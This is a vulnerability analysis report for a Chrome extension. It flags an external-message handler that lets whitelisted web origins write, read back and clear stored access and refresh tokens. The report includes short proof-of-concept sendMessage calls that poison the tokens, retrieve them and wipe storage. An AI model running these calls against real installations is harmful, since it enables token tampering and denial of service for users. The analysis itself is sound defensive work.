# CoCo Analysis: ldhjmijegggmkcnfhbmlahpihimemnee

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 6 (bg_chrome_runtime_MessageExternal → storage.sync.set x2, storage_sync_get_source → sendResponseExternal x2, storage.sync.clear, storage.local.clear)

---

## Sink 1 & 2: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ldhjmijegggmkcnfhbmlahpihimemnee/opgen_generated_files/bg.js
Line 993: `{ vpinAccessToken: request.vpinAccessToken }`
Line 1002: `{ vpinRefreshToken: request.vpinRefreshToken }`

**Code:**

```javascript
// Background script - External message handler (bg.js, lines 983-1034)
chrome.runtime.onMessageExternal.addListener(function (request, sender, sendResponse) {
  if (request.todo === "setToken") {
    chrome.storage.sync.set(
      { vpinAccessToken: request.vpinAccessToken }, // ← attacker-controlled data poisoning storage
      function () {
        console.log("vpinAccessToken is set to " + request.vpinAccessToken);
        chrome.action.setIcon({ path: "/images/pin_128.png" });
      }
    );
    chrome.storage.sync.set(
      { vpinRefreshToken: request.vpinRefreshToken }, // ← attacker-controlled data poisoning storage
      function () {
        console.log("vpinRefreshToken is set to " + request.vpinRefreshToken);
      }
    );
    sendResponse({ msg: "ok" });
  } else if (request.todo === "getToken") {
    getAllStorageSyncData().then((res) => {
      if (res.vpinAccessToken) {
        sendResponse({
          vpinAccessToken: res.vpinAccessToken, // ← poisoned data returned to attacker
          vpinRefreshToken: res.vpinRefreshToken, // ← poisoned data returned to attacker
        });
      }
    });
  } else if (request.todo === "clearToken") {
    chrome.storage.sync.clear(); // ← attacker can clear all storage
    chrome.storage.local.clear(); // ← attacker can clear all storage
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From whitelisted domain https://*.vpin.club/* or http://192.168.50.251:8080/*
// Attack 1: Poison storage with malicious tokens
chrome.runtime.sendMessage(
    "ldhjmijegggmkcnfhbmlahpihimemnee",
    {
        todo: "setToken",
        vpinAccessToken: "malicious_access_token",
        vpinRefreshToken: "malicious_refresh_token"
    },
    function(response) {
        console.log("Tokens poisoned:", response); // { msg: "ok" }
    }
);

// Attack 2: Read back poisoned tokens (complete storage exploitation chain)
chrome.runtime.sendMessage(
    "ldhjmijegggmkcnfhbmlahpihimemnee",
    { todo: "getToken" },
    function(response) {
        console.log("Leaked tokens:", response);
        // { vpinAccessToken: "malicious_access_token", vpinRefreshToken: "malicious_refresh_token" }
    }
);

// Attack 3: Clear all extension storage (DoS)
chrome.runtime.sendMessage(
    "ldhjmijegggmkcnfhbmlahpihimemnee",
    { todo: "clearToken" },
    function(response) {
        console.log("Storage cleared");
    }
);
```

**Impact:** Complete storage exploitation chain - external websites (whitelisted domains) can:
1. Write arbitrary data to chrome.storage.sync (vpinAccessToken, vpinRefreshToken)
2. Read back the poisoned tokens via sendResponse (completing the exploitation chain)
3. Clear all extension storage (sync and local), causing denial of service
4. Manipulate authentication tokens used by the extension

This is a complete storage poisoning + retrieval vulnerability, allowing attackers to both inject malicious data and exfiltrate stored credentials.

---

## Sink 3 & 4: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ldhjmijegggmkcnfhbmlahpihimemnee/opgen_generated_files/bg.js
Line 727: `var storage_sync_get_source = { 'key': 'value' };` (CoCo framework)
Line 1010: `if (res.vpinAccessToken)`
Line 1013: `vpinRefreshToken: res.vpinRefreshToken`

**Analysis:** This is the retrieval side of the storage exploitation chain, already covered in Sink 1 & 2 above.

**Classification:** TRUE POSITIVE (same vulnerability as Sink 1 & 2)

---

## Sink 5 & 6: chrome_storage_sync_clear_sink & chrome_storage_local_clear_sink

**CoCo Trace:**
Lines 1028-1029: `chrome.storage.sync.clear()` and `chrome.storage.local.clear()`

**Analysis:** External attackers can trigger complete storage wipe via the "clearToken" message, already covered in Sink 1 & 2 above.

**Classification:** TRUE POSITIVE (same vulnerability as Sink 1 & 2)
